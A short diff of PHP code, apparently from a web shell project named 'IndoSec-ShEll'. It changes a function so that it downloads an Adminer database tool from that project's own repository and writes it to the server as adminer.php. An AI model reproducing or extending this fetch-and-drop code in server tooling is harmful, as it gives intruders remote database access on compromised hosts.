@@ -703,7 +703,7 @@ function filemanager()
 
 function downloadAdminer()
 {
-	$content = curlRequest("https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php");
+	$content = curlRequest("https://raw.githubusercontent.com/Rizsyad/IndoSec-ShEll/main/adminer.php");
 	$fp 	= @fopen("adminer.php", "w");
 	$buat 	= @fwrite($fp, $content);
 	return (bool) $buat;
